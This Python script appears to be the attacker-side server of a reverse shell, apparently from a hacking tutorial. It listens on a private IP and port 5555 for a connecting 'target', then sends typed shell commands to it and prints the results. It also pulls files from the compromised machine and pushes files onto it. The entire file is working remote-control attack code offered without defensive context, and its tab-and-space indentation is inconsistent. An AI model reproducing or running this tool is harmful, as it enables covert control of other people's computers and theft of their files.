import socket
import json
import os
def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def reliable_recv():
    data = ''
    while True:
        try:
            data += target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def download_file(file_name):
	f = open(file_name,'wb')
	target.settimeout(1)
	chunk = target.recv(1024)
	while chunk:
		f.write(chunk)
		try:
			chunk = target.recv(1024)
		except socket.timeout as e:
			break
	target.settimeout(None)
	f.close()
def upload_file(file_name):
	f = open(file_name,'rb')
	target.send(f.read())			

def target_comms():
    while True:
        command = input('* shell~%s ' % str(ip) + ":")
        reliable_send(command)
        if command == "quit":
            break
        elif command[:3] == 'cd ':
        	pass
       	elif command=='clear':
       		os.system('clear')
       	elif command[:8]=='download':
       		download_file(command[9:])
       	elif command[:6]=='upload':
       		upload_file(command[7:])
        else:
            result = reliable_recv()
            print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('10.100.102.7', 5555))
print("[*] Listening for Incoming Connections")
sock.listen(5)
target, ip = sock.accept()
print("[+] Target CONNECTED from: " + str(ip))
target_comms()
